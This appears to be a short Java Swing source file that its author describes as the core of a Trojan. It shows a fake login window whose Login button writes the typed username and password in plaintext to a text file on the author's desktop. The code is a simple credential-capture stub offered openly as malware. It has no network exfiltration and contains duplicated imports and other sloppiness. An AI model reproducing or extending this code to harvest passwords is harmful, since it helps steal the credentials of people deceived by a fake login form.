/**
 * This simple recorder is core parts of Trojan, 
 * that can record the information you typed
 * Tips: using Threads to control the stream
 * 
 * @author Rick_ZHAO
 * */
import java.util.*;
import java.awt.*;

import javax.swing.*;

import java.awt.*;
import java.awt.event.*;
import java.util.*;
import java.io.*;
public class window  extends JFrame{
	 JPanel jp1,jp2,jp3;
		 JButton login=new JButton("Login");
		 JLabel user,passw;
		  JTextField username=new JTextField(10);
		 JPasswordField password =new JPasswordField(10);
	 public window()
	 {
		 jp1=new JPanel(); jp2=new JPanel();
		 jp3=new JPanel();
		 user=new JLabel("Username");
		 passw=new JLabel("password");
		 jp1.add(user);
		 jp1.add(username);
		 jp2.add(passw);
		 jp2.add(password);
		 jp3.add(login);
		 this.setLayout(new GridLayout(3,2));
		 this.add(jp1);
		 this.add(jp2);
		 this.add(jp3);
		 this.setTitle("Keyboard Recorder");
		 this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		this.setLocationRelativeTo(null);
		this.setSize(250	,200);
		this.setResizable(false);
		this.setVisible(true);
		login.addActionListener(new ActionListener() {
			 public void actionPerformed(ActionEvent e)
				{
					String cmd=e.getActionCommand();
					if(cmd.equals("Login"))
					{
						File f=new File("/Users/ds_rick/desktop/account.txt");
						if(!f.exists())
						{
							try {
								f.createNewFile();
							} catch (IOException e1) {
								// TODO Auto-generated catch block
								e1.printStackTrace();
							}
						}//Check the file existed or not if not, create a new one
					
						BufferedOutputStream bro = null;
						try {
							bro=new BufferedOutputStream(new FileOutputStream(f));
							String usrname1=username.getText();
							String password1=new String(password.getPassword());//password is chart so we have to convert to String
							String infor="username: "+usrname1+" password:"+password1;
							bro.write((infor.getBytes()));
							} catch (Exception e2) {
							// TODO: handle exception
						}finally
						{
							try {
								bro.close();
							} catch (IOException e1) {
								// TODO Auto-generated catch block
								e1.printStackTrace();
							}
						}
						
						
					}
				}
			
		});
		
		 }
	 /**
	 * Now create the events
	 * */
	
	 
	 
}

